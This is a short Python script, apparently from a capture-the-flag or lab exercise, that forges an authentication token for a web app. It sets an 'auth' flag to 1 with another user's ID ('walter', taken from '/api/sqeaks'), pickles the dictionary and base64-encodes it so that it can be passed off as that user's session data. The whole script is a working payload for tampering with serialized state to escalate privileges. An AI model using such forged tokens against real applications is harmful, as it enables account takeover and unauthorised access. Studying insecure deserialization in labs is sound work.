import pickle
import base64

# JSON object - existing account details 
json_acc_details = {
    "auth": 1, # change status to `1` instead of `0` 
    "userid": "905b4296-e591-4b81-8ad6-b9abf90bf07d" # walter's user ID returned from `/api/sqeaks`
}

# Serialize walter's account details to pickle (protocol 3 for compatibility with Python 3.x)
acc_details_pickled = pickle.dumps(json_acc_details, protocol=3)

# Base64 encode the acc_details_pickled data
acc_details_pickled_b64_encoded = base64.b64encode(acc_details_pickled).decode("utf-8")

print(acc_details_pickled_b64_encoded)
